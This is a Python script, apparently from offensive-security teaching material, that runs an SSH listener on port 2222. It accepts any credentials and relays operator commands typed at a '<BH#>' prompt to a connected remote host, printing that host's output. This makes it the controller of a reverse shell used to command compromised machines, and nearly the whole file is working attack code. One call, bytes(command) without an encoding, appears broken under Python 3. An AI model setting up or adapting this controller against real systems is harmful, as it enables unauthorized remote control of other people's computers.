import sys
import paramiko
import socket
import threading

host_key = paramiko.rsakey.RSAKey.generate()


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL


    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_SUCCESSFUL



server = ''
ssh_port = 2222

try:
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('[+] Listening for connecting...')
except Exception as e:
    print('[-] Listen failed:' + str(e))
    sys.exit(1)
client,addr=sock.accept()
bhSession = paramiko.Transport(client)
bhSession.add_server_key(host_key)
server = Server()
try:
    bhSession.start_server(server=server)
except paramiko.SSHException as x:
    print('[-] SSH negotiation failed:' + str(x))
chan = bhSession.accept(20)
print('[+] Authenticated')
while True:
    try:
        command = input('<BH#>').strip('\n')
        if command != 'exit':
            chan.send(bytes(command))
            print(str(chan.recv(1024)))
        else:
            chan.send(b'exit')
            print('exiting...')
            bhSession.close()
            raise Exception('exit')
    except KeyboardInterrupt:
        bhSession.close()
    except Exception as e:
        print('[-] Catch exception:' + str(e))
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)
